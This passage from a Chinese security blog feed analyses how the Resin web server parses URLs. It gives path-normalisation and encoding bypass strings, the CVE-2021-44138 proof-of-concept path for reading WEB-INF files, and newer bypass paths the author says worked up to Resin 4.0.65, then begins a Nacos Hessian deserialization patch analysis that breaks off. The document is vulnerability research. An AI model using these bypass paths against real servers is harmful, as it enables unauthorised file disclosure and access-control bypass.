class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.jsp</span><span class="hljs-selector-class">.JspServlet</span><br>resin-jspx          com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.jsp</span><span class="hljs-selector-class">.JspServlet</span><br>resin-file          com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.servlets</span><span class="hljs-selector-class">.FileServlet</span><br>resin-php           com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.quercus</span><span class="hljs-selector-class">.servlet</span>.QuercusServlet<br></code></pre></td></tr></table></figure><p>在第二步的WebApp#buildSecurity-&gt;ConstraintManager#build 发现<code>_contextUri</code>为&#x2F;web-inf、&#x2F;meta-inf开头时，添加404 ErrorFilterChain，这样后续处理就不会进入resin-file这个servlet</p><p><img src="/img/from-urlparser-to-authbypass-resin/10.png"></p><p>上面就是Resin解析的整体流程，我们重点看下几个重点方法：normalizeUri、UrlMap#map()、ServletInvocation#stripPathParameters等</p><p>1、normalizeUri 重点处理方法</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs sas">public String normalizeUri(String uri, boolean isWindows) throws IOException &#123;<br>        CharBuffer cb = new CharBuffer();<br>        int len = uri.<span class="hljs-meta">length</span>();<br>        <span class="hljs-keyword">if</span> (this._maxURILength &lt; len) &#123;<br>            throw new BadRequestExceptio<span class="hljs-meta">n</span>(L.l(<span class="hljs-string">&quot;The request contains an illegal URL because it is too long.&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            char ch;<br>            <span class="hljs-keyword">if</span> (len == 0 || (ch = uri.charAt(0)) != <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-variable">&amp;&amp;</span> ch != <span class="hljs-string">&#x27;\\&#x27;</span>) &#123;//开头不是/、\，那么往cb添加/<br>                cb.append(<span class="hljs-string">&#x27;/&#x27;</span>);<br>            &#125;<br><br>            for(int i = 0; i &lt; len; ++i) &#123;<br>                ch = uri.charAt(i);<br>                <span class="hljs-keyword">if</span> (ch != <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-variable">&amp;&amp;</span> ch != <span class="hljs-string">&#x27;\\&#x27;</span>) &#123;// 开头的字符ascii如果是0，那么报错<br>                    <span class="hljs-keyword">if</span> (ch == 0) &#123;<br>                        throw new BadRequestExceptio<span class="hljs-meta">n</span>(L.l(<span class="hljs-string">&quot;The request contains an illegal URL.&quot;</span>));<br>                    &#125;<br><br>                    cb.append(ch);// 如果是除了/、\的其它字符，那么往cb直接添加<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">while</span>(i + 1 &lt; len) &#123;// 如果碰见了分隔符，那么就在这里处理<br>                        ch = uri.charAt(i + 1);<br>                        <span class="hljs-keyword">if</span> (ch != <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-variable">&amp;&amp;</span> ch != <span class="hljs-string">&#x27;\\&#x27;</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (ch != <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                                break;<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (len &gt; i + 2 <span class="hljs-variable">&amp;&amp;</span> (ch = uri.charAt(i + 2)) != <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-variable">&amp;&amp;</span> ch != <span class="hljs-string">&#x27;\\&#x27;</span>) &#123;<br>                                <span class="hljs-keyword">if</span> (ch != <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                                    break;<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span> (len &gt; i + 3 <span class="hljs-variable">&amp;&amp;</span> (ch = uri.charAt(i + 3)) != <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-variable">&amp;&amp;</span> ch != <span class="hljs-string">&#x27;\\&#x27;</span>) &#123;<br>                                    throw new BadRequestExceptio<span class="hljs-meta">n</span>(L.l(<span class="hljs-string">&quot;The request contains an illegal URL.&quot;</span>));<br>                                &#125;<br><br>                                int j;<br>                                for(j = cb.<span class="hljs-meta">length</span>() - 1; j &gt;= 0 <span class="hljs-variable">&amp;&amp;</span> (ch = cb.charAt(j)) != <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-variable">&amp;&amp;</span> ch != <span class="hljs-string">&#x27;\\&#x27;</span>; --j) &#123;<br>                                &#125;<br><br>                                <span class="hljs-keyword">if</span> (j &gt; 0) &#123;<br>                                    cb.<span class="hljs-keyword">set</span><span class="hljs-meta">Length</span>(j);<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    cb.<span class="hljs-keyword">set</span><span class="hljs-meta">Length</span>(0);<br>                                &#125;<br><br>                                i += 3;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                i += 2;<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            ++i;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">while</span>(isWindows <span class="hljs-variable">&amp;&amp;</span> cb.get<span class="hljs-meta">Length</span>() &gt; 0 <span class="hljs-variable">&amp;&amp;</span> ((ch = cb.getLastChar()) == <span class="hljs-string">&#x27;.&#x27;</span> || ch == <span class="hljs-string">&#x27; &#x27;</span>)) &#123;<br>                        cb.<span class="hljs-keyword">set</span><span class="hljs-meta">Length</span>(cb.get<span class="hljs-meta">Length</span>() - 1);<br>                        <span class="hljs-keyword">if</span> (cb.get<span class="hljs-meta">Length</span>() &gt; 0 <span class="hljs-variable">&amp;&amp;</span> (ch = cb.getLastChar()) == <span class="hljs-string">&#x27;/&#x27;</span> || ch == <span class="hljs-string">&#x27;\\&#x27;</span>) &#123;<br>                            cb.<span class="hljs-keyword">set</span><span class="hljs-meta">Length</span>(cb.get<span class="hljs-meta">Length</span>() - 1);<br>                        &#125;<br>                    &#125;<br><br>                    cb.append(<span class="hljs-string">&#x27;/&#x27;</span>);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">while</span>(isWindows <span class="hljs-variable">&amp;&amp;</span> cb.get<span class="hljs-meta">Length</span>() &gt; 0 <span class="hljs-variable">&amp;&amp;</span> ((ch = cb.getLastChar()) == <span class="hljs-string">&#x27;.&#x27;</span> || ch == <span class="hljs-string">&#x27; &#x27;</span>)) &#123;<br>                cb.<span class="hljs-keyword">set</span><span class="hljs-meta">Length</span>(cb.get<span class="hljs-meta">Length</span>() - 1);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> cb.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>对于normalizeUri 解析情况的一些测试</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/demo//hello</span><br>如果分隔符后面1个字符还是分隔符，不单独处理，继续解析后面的字符，反应到结果中就是<span class="hljs-string">/demo/hello</span><br><br><span class="hljs-string">/demo/./hello</span><br>如果分隔符后面是.加分隔符，不单独处理，继续解析后面字符，反应到结果中就是<span class="hljs-string">/demo/hello</span><br><br><span class="hljs-string">/demo/../hello</span><br>如果分隔符后面是<span class="hljs-string">..</span>加分隔符，回退一级目录，反应到结果中就是<span class="hljs-string">/hello</span><br><br><span class="hljs-string">/demo/..a/hello</span><br>如果分隔符后面是<span class="hljs-string">..</span>加除分隔符（\ /）外的其它字符，报错：The request contains an illegal URL.<br><br><span class="hljs-string">/demo/hello....</span><br><span class="hljs-string">/demo/hello</span><span class="hljs-params">(空格)</span><br><span class="hljs-string">/demo/hello....................</span><span class="hljs-params">(空格)</span><br>windows下：删除结尾的多个. 多个空格 多个分隔符<span class="hljs-params">(/、\)</span>，反应到结果中就是<span class="hljs-string">/demo/hello</span><br><br><span class="hljs-string">/demo/hello..................../</span><br>windows下：删除. 删除末尾分隔符，再添加分隔符，反应到结果就是<span class="hljs-string">/demo/hello/</span><br></code></pre></td></tr></table></figure><p>2、UrlMap#map()正则解析，&#x2F;hello是我注册的路由，正则匹配为<code>^/hello$</code>。而Resin默认路由如<code>*.jsp</code>，正则为<code>^.*\.jsp(?=/)|^.*\.jsp\z</code>。在正则中，\z表示字符串的绝对末尾，$表示行尾。所以\z可以匹配到换行符而$不能。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">精确匹配，<span class="hljs-string">/hello</span>对应的正则是^<span class="hljs-string">/hello</span>$<br>后缀匹配，*<span class="hljs-string">.jsp</span> 对应的正则是^.*\<span class="hljs-string">.jsp</span><span class="hljs-params">(?=/)</span>|^.*\<span class="hljs-string">.jsp</span>\z<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-resin/11.png"></p><p>3、ServletInvocation#stripPathParameters</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span>、<span class="hljs-comment">;前面不能是/ 否则会报错IllegalArgumentException：is an invalid URL.</span><br><span class="hljs-number">2</span>、删除<span class="hljs-comment">;及后面的参数：即删除 ;(会删) 到 /(不会删) 之间或者到 URI 末尾的内容，返回路由查找的uri</span><br><br>例：<br>stripPathParameters(<span class="hljs-string">&quot;/demo......;aasss..=a//b.jsp.;a=s&quot;</span>)<span class="hljs-comment">;  ==  /demo......//b.jsp.</span><br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-resin/12.png"></p><h2 id="3、-解析绕过"><a href="#3、-解析绕过" class="headerlink" title="3、 解析绕过"></a>3、 解析绕过</h2><p>我自己编写的servlet的路由是&#x2F;demo&#x2F;hello，基于上面的解析分析，可以产生多种绕过的情况。下面5种类型的url均能访问到最终的servlet</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">1、编码绕过<br><span class="hljs-string">/demo/hel</span>%6co   编码绕过，基于InvocationDecoder<span class="hljs-comment">#normalizeUriEscape</span><br><span class="hljs-string">/demo/hel</span>%u006co   编码绕过，基于InvocationDecoder<span class="hljs-comment">#normalizeUriEscape</span><br><br>2、<span class="hljs-string">//</span> <span class="hljs-string">./</span> <span class="hljs-string">../</span> \ 路径归一化解析绕过<br><span class="hljs-string">/demo//hello</span>   双写分隔符绕过，基于InvocationDecoder<span class="hljs-comment">#normalizeUri路径归一化，resin会解析为一个分隔符</span><br><span class="hljs-string">/demo/./hello</span>   <span class="hljs-string">./</span>绕过，基于InvocationDecoder<span class="hljs-comment">#normalizeUri路径归一化，resin会解析为一个分隔符</span><br><span class="hljs-string">/xxxx/../demo/hello</span>   <span class="hljs-string">../</span>绕过，基于InvocationDecoder<span class="hljs-comment">#normalizeUri路径归一化，resin会递归到上一级目录</span><br><span class="hljs-string">../demo/hello</span>   <span class="hljs-string">../</span>绕过，基于InvocationDecoder<span class="hljs-comment">#normalizeUri路径归一化，resin会递归到根目录</span><br><span class="hljs-string">/demo</span>\hello     \ 绕过，基于InvocationDecoder<span class="hljs-comment">#normalizeUri 路径归一化，resin会解析为/</span><br><br>3、空格、. 等windows环境下的解析绕过<br><span class="hljs-string">/demo</span>%20/hello  <br><span class="hljs-string">/demo/hello</span>%20<br><span class="hljs-string">/demo/hello....</span>%20<br><span class="hljs-string">/demo../hello....</span>  空格与.绕过，基于InvocationDecoder<span class="hljs-comment">#normalizeUri 路径归一化，windows系统环境中，resin会删除路径末尾的.与空格。末尾指的是每个分隔符中路径的末尾，而不是整个url的末尾</span><br><br>4、参数绕过<br><span class="hljs-string">/demo/hello</span>;a=b  参数绕过，基于ServletInvocation<span class="hljs-comment">#stripPathParameters，resin会删除;及后面的参数内容</span><br><br>5、正则匹配绕过<br><span class="hljs-string">/demo/hello</span>%0a<br><span class="hljs-string">/demo/hello</span>%0d  正则绕过，基于UrlMap<span class="hljs-comment">#map()中正则表达式 $ 不匹配换行的特性</span><br></code></pre></td></tr></table></figure><p>1、编码绕过</p><p><img src="/img/from-urlparser-to-authbypass-resin/13.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/14.png"></p><p>2、路径归一化解析绕过</p><p><img src="/img/from-urlparser-to-authbypass-resin/15.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/16.png"></p><p>..&#x2F; 绕过</p><p><img src="/img/from-urlparser-to-authbypass-resin/17.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/18.png"></p><p>\ 绕过</p><p><img src="/img/from-urlparser-to-authbypass-resin/19.png"></p><p>3、空格与.绕过，windows环境解析</p><p><img src="/img/from-urlparser-to-authbypass-resin/20.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/21.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/22.png"></p><p>4、参数绕过</p><p><img src="/img/from-urlparser-to-authbypass-resin/23.png"></p><p>5、正则匹配绕过：%0a、%0d、</p><p><img src="/img/from-urlparser-to-authbypass-resin/24.png"></p><h2 id="4、-CVE-2021-44138-gt-CVE-XX"><a href="#4、-CVE-2021-44138-gt-CVE-XX" class="headerlink" title="4、 CVE-2021-44138 -&gt; CVE-XX"></a>4、 CVE-2021-44138 -&gt; CVE-XX</h2><p>上面分析了Resin解析url的流程及几种绕过的方案，在碰到使用Resin的系统时，还需要根据系统自写的Filter代码来判断是否可以利用”特殊路径URL”完成鉴权绕过进而达到RCE&#x2F;Getshell的目标。我们先看下Resin自带的Servlet是否受URL解析问题的影响</p><p>最先看到有个漏洞：CVE-2021-44138  <a href="https://github.com/maybe-why-not/reponame/issues/2">https://github.com/maybe-why-not/reponame/issues/2</a>  poc：<code>/resin-doc/;/WEB-INF/resin-web.xml</code></p><p><img src="/img/from-urlparser-to-authbypass-resin/25.png"></p><p>跟一下该url的解析逻辑，分析下为什么; 可以读到web-inf下面的文件源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/resin-doc/</span>;<span class="hljs-regexp">/WEB-INF/</span>resin-web.xml  传入url<br><br>com.caucho.server.http.HttpRequest<span class="hljs-comment">#handleRequest</span><br>...<br>com.caucho.server.webapp.WebAppContainer<span class="hljs-comment">#buildInvocation</span><br>com.caucho.server.webapp.WebAppContainer<span class="hljs-comment">#getWebAppController</span><br><span class="hljs-regexp">//</span><span class="hljs-number">1</span>、将contextPath与contextUri分割开，poc被分割为<span class="hljs-regexp">/resin-doc与/</span>;<span class="hljs-regexp">/WEB-INF/</span>resin-web.xml<br>com.caucho.server.webapp.WebApp<span class="hljs-comment">#buildInvocation</span><br>com.caucho.server.dispatch.ServletMapper<span class="hljs-comment">#mapServlet  </span><br><span class="hljs-regexp">//</span><span class="hljs-number">1</span>、根据;位置删除参数信息，得到<span class="hljs-regexp">//</span>WEB-INF/resin-web.xml 默认servlet正则匹配不到<br><span class="hljs-regexp">//</span><span class="hljs-number">2</span>、使用getResourceAsStream，传入原始url（<span class="hljs-regexp">/;/</span>WEB-INF/resin-web.xml  会经过normalizeUri路径归一化、未删除;）找文件，因为带了;所以定位不到文件<br><span class="hljs-regexp">//</span><span class="hljs-number">3</span>、默认走resin-file这个servlet<br>com.caucho.server.webapp.WebApp<span class="hljs-comment">#buildSecurity</span><br>    com.caucho.server.security.ConstraintManager<span class="hljs-comment">#build</span><br>    <span class="hljs-regexp">//</span><span class="hljs-number">1</span>、判断contextUri是否是<span class="hljs-regexp">/web-inf、/m</span>eta-inf 开头。如果是，那么后续将<span class="hljs-number">404</span>报错，不走resin-file servlet<br>com.caucho.server.dispatch.ServletInvocation<span class="hljs-comment">#setServletPath</span><br><span class="hljs-regexp">//</span><span class="hljs-number">1</span>、设置ServletPath时调用stripPathParameters根据;位置删除参数信息。后面FileServlet流程主要使用的就是这里的ServletPath。得到<span class="hljs-regexp">//</span>WEB-INF/resin-web.xml<br>...<br>com.caucho.servlets.FileServlet<span class="hljs-comment">#service</span><br>        <span class="hljs-number">1</span>、调用原始url拿缓存FileServlet.Cache，如果无缓存证明是第一次访问<br>        <span class="hljs-number">2</span>、根据上面设置的ServletPath 赋值给relPath，得到：<span class="hljs-regexp">//</span>WEB-INF/resin-web.xml<br>            relPath = relPath + _pathInfo(null)  <br>        <span class="hljs-number">3</span>、接着根据relPath得到filename、真实路径path（这里会经过路径归一化处理，处理掉空格 <span class="hljs-regexp">//</span> ./这些字符）。定位到xml文件<br>             d:\img\resin-<span class="hljs-number">4.0</span>.<span class="hljs-number">56</span>\doc\resin-doc\web-inf\resin-web.xml<br>        <span class="hljs-number">4</span>、对relPath进行判断，如果前<span class="hljs-number">8</span>位不是<span class="hljs-regexp">/web-inf、前9位不是/m</span>eta-inf 那么就绕过<span class="hljs-number">404</span>返回包。这里是<span class="hljs-regexp">//</span>所以会绕过检测<br>        <span class="hljs-number">5</span>、isWindowsInsecure对path是否是windows下的安全字符进行判断，满足任意一项就报错<span class="hljs-number">404</span><br>        最后一个字符是. 空格 * ? / \<br>            以::<span class="hljs-variable">$data</span>结尾<br>            url中包含<span class="hljs-regexp">/con. /</span>con<span class="hljs-regexp">/ 或者以/</span>con结尾，举例con，还有很多其它的字符串<br>        <span class="hljs-number">6</span>、如果有<span class="hljs-number">0</span>字符，报错<span class="hljs-number">404</span>。否则继续添加到缓存，方便下次调用时直接定位<br>        <span class="hljs-number">7</span>、调用AbstractResponseStream<span class="hljs-comment">#sendFile 根据真实路径path得到文件内容并返回</span><br><br>对relPath路径的判断：<br>/web-inf  <span class="hljs-number">404</span><br>/meta-inf <span class="hljs-number">404</span><br>/web-infaaa <span class="hljs-number">200</span><br><span class="hljs-regexp">/web-inf/</span>  <span class="hljs-number">404</span><br>/web-inf.  <span class="hljs-number">404</span><br><span class="hljs-regexp">//</span>web-inf/xxx <span class="hljs-number">200</span> 绕过<br></code></pre></td></tr></table></figure><p>总体来说：<strong>测试的 &#x2F;resin-doc&#x2F;;&#x2F;WEB-INF&#x2F;resin-web.xml 在经过WebAppContainer#getWebAppController时，将contextPath与contextUri分割开，poc被分割为&#x2F;resin-doc与&#x2F;;&#x2F;WEB-INF&#x2F;resin-web.xml。contextUri不以<code>/web-inf、/meta-inf</code>开头，绕过了WebApp#buildSecurity判断。接着在传入resin默认FileServlet#service读取文件前，调用了ServletInvocation#setServletPath去除了contextUri中的;参数信息。导致&#x2F;&#x2F;WEB-INF&#x2F;resin-web.xml饶过FileServlet#service中对于<code>/web-inf、/meta-inf开头、长度</code>的判断，进而读到web.xml文件</strong></p><p>为什么.&#x2F; ..&#x2F; %20 空格 unicode编码等其它字符不可以绕过限制？</p><p>因为这些路径在到达FileServlet#service读取文件之前，会经过InvocationDecoder#normalizeUri归一化、WebAppContainer#getWebAppController分割，contextUri都变成了&#x2F;WEB-INF&#x2F;resin-web.xml，以&#x2F;web-inf、&#x2F;meta-inf开头，无法绕过WebApp#buildSecurity的判断，都会报404错误。如下是发送&#x2F;resin-doc&#x2F;%20&#x2F;WEB-INF&#x2F;resin-web.xml 的调试情况，无法绕过</p><p><img src="/img/from-urlparser-to-authbypass-resin/26.png"></p><p>在漏洞作者报送给官方后，resin官方在4.0.57版本对此漏洞做了修复：</p><p>1、在ServletInvocation#stripPathParameters中对&#x2F;;xxx&#x2F;做了额外处理，如果碰到;前面是&#x2F;，那么;后面的&#x2F;就不再保留。之前的解析：a&#x2F;;xxx&#x2F;bc &#x3D;&gt; a&#x2F;&#x2F;bc  现在的解析： &#x2F;;xxx&#x2F; &#x3D;&gt; a&#x2F;bc</p><p>2、在FileServlet#service 中对&#x2F;&#x2F;做了处理：经过格式化后的relPath是&#x2F;&#x2F;开头，那么报错404</p><p><img src="/img/from-urlparser-to-authbypass-resin/27.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/28.png"></p><p>这样原来得<code>/resin-doc/;/WEB-INF/resin-web.xml</code>在经过stripPathParameters格式化后到达FileServlet#service是<code>/WEB-INF/resin-web.xml</code> ，resin判断前8位为&#x2F;web-inf后报错404</p><p><img src="/img/from-urlparser-to-authbypass-resin/29.png"></p><p>因为stripPathParameters是看;前面是否是&#x2F;决定是否要把后面的分隔符去除掉，我们结合之前对url解析的分析，会产生几个可用于绕过的poc：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/resin-doc/</span>%<span class="hljs-number">20</span>;<span class="hljs-regexp">/WEB-INF/</span>resin-web.xml<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-resin/30.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/resin-doc;<span class="hljs-regexp">/WEB-INF/</span>resin-web.xml<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-resin/31.png"></p><p>&#x2F;resin-doc;&#x2F;WEB-INF&#x2F;resin-web.xml 绕过原理：经过处理的contextUri为&#x2F;resin-doc;&#x2F;WEB-INF&#x2F;resin-web.xml，不以<code>/web-inf、/meta-inf</code>开头，绕过了WebApp#buildSecurity判断，接着经过stripPathParameters处理后为&#x2F;resin-doc&#x2F;WEB-INF&#x2F;resin-web.xml，能绕过FileServlet#service中对于web-inf和meta-inf的判断。所以能达到与 &#x2F;resin-doc&#x2F;;&#x2F;WEB-INF&#x2F;resin-web.xml 相同的效果</p><p>第一个绕过的poc<code>/resin-doc/%20;/WEB-INF/resin-web.xml</code>一直绕到4.0.65</p><p><img src="/img/from-urlparser-to-authbypass-resin/32.png"></p><p>这种绕过方式一直到了最新版4.0.66才完全修复，可以看到最新版的InvocationDecoder#normalizeUri中对于.跟空格的处理逻辑被改变了，先前是直接删除，现在是替换为_</p><p><img src="/img/from-urlparser-to-authbypass-resin/33.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/34.png"></p><p>导致原先&#x2F;%20;&#x2F;无法绕过：在FileServlet#service调用getRealPath获取文件名时，会调用一次normalizeUri，将%20替换为_  后面由于文件路径不存在，报错404退出</p><p><img src="/img/from-urlparser-to-authbypass-resin/35.png"></p><p><img src="/img/from-urlparser-to-authbypass-resin/36.png"></p><h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>本文重点分析了Resin中间件对URL路径部分的解析过程，并产生了多个中间件能够”兼容解析”的特殊路径。在实际审计过程中，如果碰到基于Resin的业务系统，就可以结合业务系统的FIlter判断逻辑进行权限Bypass绕过。并且在分析研究过程中发现了一个网上未公开的特殊路径:<code>ab/%20;/c</code>，能够影响Resin4.0.65及之前的版本。</p>]]></content>
    
    
    <categories>
      
      <category>体系化总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Resin</tag>
      
      <tag>JavaWeb</tag>
      
      <tag>Bypass</tag>
      
      <tag>URL-Parser</tag>
      
      <tag>权限校验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从Ali-Nacos-RCE漏洞看RPC-Hessian协议安全</title>
    <link href="/2023/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/"/>
    <url>/2023/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/</url>
    
    <content type="html"><![CDATA[<h2 id="1、起源"><a href="#1、起源" class="headerlink" title="1、起源"></a>1、起源</h2><p>从朋友圈了解到nacos出了个洞，看起来是rce还挺唬人的，客户部署量也比较多。本着为甲方客户爸爸负责到底的原则，对此漏洞进行了应急追踪。最后也根据官方文档成功构造好Jraft客户端与Hessian反序列化only jdk Gadget的EXP。以下第二章节内容为当时追踪分析的笔记，未提供exp，仅技术交流讨论。第三章节是Hessian反序列化相关的知识补充，在完成了此漏洞的应急分析后，对整个过程复盘时发现自己对于Hessian的相关知识了解不深，想着近些年微服务&#x2F;业务上云等大趋势演进，RPC远程通信框架&#x2F;协议的安全问题一定会是未来安全的重点。索性趁着这次机会趁热打铁，把Hessian协议的知识总结消化一波。 如果对文章有疑问&#x2F;建议或者想一起研究交流的师傅，欢迎私信😜</p><p><strong>PS：本文仅用于技术讨论。严禁用于任何非法用途，违者后果自负！</strong></p><p>笔者在之前的几篇文章中，对rpc相关的thrift、rmi、jmx等协议的详细分析</p><p><a href="https://pwnull.github.io/2022/How-to-attack-RMI-based-JMX-services/">Attack JMX Service的打开方式</a></p><p><a href="https://pwnull.github.io/2023/Research-VMware-vRealize-Log-Insight-CVE-vulnerability/">VMware-vRealize-Log-Insight-thrift-RPC调用RCE</a></p><p><a href="https://pwnull.github.io/2022/Exploring-JAVA-RMI's-offensive-and-defensive-history/">论RMI的攻防演进史</a></p><h2 id="2、补丁分析"><a href="#2、补丁分析" class="headerlink" title="2、补丁分析"></a>2、补丁分析</h2><p>Nacos是 Dynamic Naming and Configuration Service的首字母简称，是阿里推出的一个易于构建云原生应用的动态服务发现、配置管理和服务管理平台。 Nacos构建了以”服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施，其在各行各业的应用极为普遍广泛。</p><p>在Nacos新版本发布说明提取到几个关键词： Jraft请求处理、hessian反序列化未限制、RCE、7848端口  </p><p><a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/1.png"></p><p>检索下官方文档关于Jraft请求的信息   </p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/2.png"></p><p>看到 <a href="https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html">https://nacos.io/zh-cn/docs/v2/upgrading/2.0.0-compatibility.html</a> Nacos默认开启了7848端口，用于处理服务端见的Raft相关请求</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/3.png"></p><p>继续看下修复的commit，涉及了Hessian反序列化操作。添加了NacosHessianSerializerFactory白名单  <a href="https://github.com/alibaba/nacos/pull/10542/commits">https://github.com/alibaba/nacos/pull/10542/commits</a></p><p>下载存在漏洞的版本nacos-server-2.2.2.zip，解压后启动运行：<code>startup.cmd -m standalone</code></p><p>在InstanceMetadataProcessor、ServiceMetadataProcessor的 onApply 方法中调用了serializer.deserialize，而默认的serializer为HessianSerializer</p><p><a 